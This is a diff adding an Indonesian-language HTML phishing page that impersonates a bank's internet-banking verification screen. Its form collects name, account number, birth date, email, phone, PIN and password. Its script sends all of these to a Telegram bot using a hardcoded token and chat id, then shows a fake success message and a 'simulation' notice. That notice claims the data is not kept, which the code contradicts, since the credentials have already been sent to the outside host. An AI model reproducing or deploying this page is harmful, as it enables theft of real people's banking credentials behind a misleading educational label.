@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Verifikasi Akun | Bank Indonesia Digital</title>
+
+
+  <style>
+    body {
+      background: linear-gradient(to bottom right, #f9f9f9, #dbe9f4);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 500px;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      color: #005B8F;
+      text-align: center;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+
+    input[type="submit"] {
+      background-color: #005B8F;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #003f63;
+    }
+
+    #thanks {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+      <h2>Verifikasi Akun Internet Banking Anda</h2>
+      <h2>Bank Indonesia Digital</h2>
+    <form id="pishingForm">
+      <input type="text" id="nama" placeholder="Nama Lengkap" required>
+      <input type="text" id="rekening" placeholder="Nomor Rekening" required>
+      <select id="bank" required>
+        <option value="" disabled selected>Pilih Bank</option>
+        <option value="BCA">BCA</option>
+        <option value="BNI">BNI</option>
+        <option value="BRI">BRI</option>
+        <option value="Mandiri">Mandiri</option>
+        <option value="BTN">BTN</option>
+      </select>
+      <input type="date" id="lahir" required>
+      <input type="email" id="email" placeholder="Email Aktif" required>
+      <input type="tel" id="hp" placeholder="Nomor HP" required>
+      <input type="password" id="pin" placeholder="PIN Internet Banking" required>
+      <input type="password" id="password" placeholder="Kata Sandi Akun" required>
+      <input type="submit" value="Login">
+    </form>
+
+    <div id="thanks" style="display:none;">
+      <h3>Login Berhasil</h3>
+      <p>Terima kasih telah menggunakan layanan kami.</p>
+    </div>
+
+    <div id="edukasi" style="display:none; margin-top: 40px; text-align: center;">
+        <h1>⚠️ Ini Hanyalah Simulasi!</h1>
+        <p>Data yang baru saja kamu masukkan <strong>TIDAK</strong> disimpan untuk tujuan negatif.</p>
+        <p>Simulasi ini dibuat untuk menunjukkan bahwa form palsu seperti ini bisa mencuri data pribadi penting seperti data bank, bila kamu tidak hati-hati.</p>
+        <h3>Ciri-ciri form phishing bank:</h3>
+        <ul style="text-align: left; display: inline-block;">
+            <li>Alamat web aneh (bukan .co.id atau .com resmi)</li>
+            <li>Tampilan mirip bank tapi tanpa keamanan (https)</li>
+            <li>Meminta PIN secara langsung</li>
+        </ul>
+        <p><strong>Ingat:</strong> Bank tidak pernah meminta PIN via web/email!</p>
+      </div>
+      
+  </div>
+
+  <script>
+    document.getElementById("pishingForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const nama = document.getElementById("nama").value;
+      const rekening = document.getElementById("rekening").value;
+      const bank = document.getElementById("bank").value;
+      const lahir = document.getElementById("lahir").value;
+      const email = document.getElementById("email").value;
+      const hp = document.getElementById("hp").value;
+      const pin = document.getElementById("pin").value;
+      const password = document.getElementById("password").value;
+
+      const message = `📥 *Simulasi Pishing Form:*\n` +
+        `Nama: ${nama}\n` +
+        `Bank: ${bank}\n` +
+        `Rekening: ${rekening}\n` +
+        `Tanggal Lahir: ${lahir}\n` +
+        `Email: ${email}\n` +
+        `No HP: ${hp}\n` +
+        `PIN IB: ${pin}\n` +
+        `Password: ${password}`;
+
+      const token = "7627286035:AAG6PaEaGSlI5twPcI7I0ZqVb5stt8H8T6g";
+      const chat_id = 5318505532;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+
+      document.getElementById("pishingForm").style.display = "none";
+      document.getElementById("thanks").style.display = "block";
+      
+      //Tampilkan bagian edukasi setelah 10 detik
+      setTimeout(() => {
+        document.getElementById("thanks").style.display = "none";
+        document.getElementById("edukasi").style.display = "block";
+      }, 10000);
+
+      
+    });
+  </script>
+</body>
+</html>
